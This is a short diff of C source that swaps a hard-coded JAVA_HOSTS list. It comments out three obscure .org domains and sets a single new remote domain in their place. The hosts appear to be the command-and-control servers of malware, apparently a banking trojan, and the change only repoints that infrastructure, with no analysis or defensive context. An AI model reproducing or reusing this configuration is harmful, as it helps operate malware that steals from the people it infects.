@@ -29,11 +29,13 @@
 	#else
 
 		//char JAVA_HOSTS[] = "88.198.35.59\0";
-		char JAVA_HOSTS[] = //"192.168.0.250\0"
-							"bifitibsystem.org\0"
-							"systemjavabindbo.org\0"
-							"ibasystemdbaodomen.org\0"
-							"\0";
+//		char JAVA_HOSTS[] = //"192.168.0.250\0"
+//							"bifitibsystem.org\0"
+//							"systemjavabindbo.org\0"
+//							"ibasystemdbaodomen.org\0"
+//							"\0";
+
+		char JAVA_HOSTS[] = "az2.zika.in\0";
 
 	#endif
 #endif
